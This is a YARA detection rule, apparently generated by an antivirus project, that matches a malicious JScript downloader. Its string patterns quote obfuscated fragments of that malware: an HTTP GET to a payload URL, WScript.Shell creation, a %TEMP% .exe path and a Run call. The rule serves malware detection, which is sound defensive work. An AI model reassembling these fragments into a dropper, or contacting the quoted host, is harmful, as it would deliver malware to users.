rule sig_20160401_8d000d2764014b9b634dbb8fd6b23ee7 {
  meta:
    description = "datamaliciousorder - file 20160401_8d000d2764014b9b634dbb8fd6b23ee7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0b2c6f5146ea1d55ebaa0d13424f2a0827eb68097a9206569a8401eda07db480"

  strings:
    $s1  = "VlDkz[CrGy](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "var TexLo = function EfLu() {return WScript[FrlGz](\"WScript\"+\".Shell\");}(), LsfXvm = 11;" fullword ascii
    $s3  = "function VwBmi(LugDc, XavJa){RedVg = RedVg * 1; return LugDc - XavJa;};" fullword ascii
    $s4  = "if (VlDkz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function McjZt() {return TexLo[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"4X3O4Vsc43FN1c.ex\" + \"e\";};" fullword ascii
    $s6  = "function OneZy(){return EnxVy + \"\";};" fullword ascii
    $s7  = "function NvSd() {return ((CdDp == true) && (CdDp == HycYp)) ? 1 : RedVg;};" fullword ascii
    $s8  = "function VbvQf(){return 23;};" fullword ascii
    $s9  = "var HycYp = false;" fullword ascii
    $s10 = "var HtMs = false;" fullword ascii
    $s11 = "var CdDp = false;" fullword ascii
    $s12 = "function ZjLdl()" fullword ascii
    $s13 = "var NiiMn = new this[\"Date\"]();" fullword ascii
    $s14 = "function KyCth(XpMtx){TexLo[\"R\"+\"un\"](XpMtx, RedVg, RedVg);};" fullword ascii
    $s15 = "CdDp = true; " fullword ascii
    $s16 = "return VwBmi(EtUp, JakIu);" fullword ascii
    $s17 = "function JbAn(AfRbn) {var ZmIv = (1, 2, 3, 4, 5, AfRbn); return ZmIv;};" fullword ascii
    $s18 = "function QbOn(){return FrlGz;};" fullword ascii
    $s19 = "HycYp = true; " fullword ascii
    $s20 = "}while (QczTjm);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}